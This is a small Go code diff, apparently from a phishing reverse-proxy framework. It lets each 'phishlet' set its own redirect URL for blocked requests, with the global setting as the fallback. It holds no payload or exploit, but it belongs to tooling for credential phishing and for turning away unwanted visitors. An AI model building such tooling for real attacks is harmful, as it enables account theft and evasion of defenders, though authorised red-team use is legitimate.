@@ -1034,7 +1034,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
 	if len(p.cfg.general.RedirectUrl) > 0 {
+
 		redirect_url := p.cfg.general.RedirectUrl
+		phishlet_redirect_url := p.getPhishletByPhishHost(req.Host).redirect_url
+
+		if len(phishlet_redirect_url) > 0 {
+			redirect_url = phishlet_redirect_url
+		}
+		
 		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 		if resp != nil {
 			resp.Header.Add("Location", redirect_url)
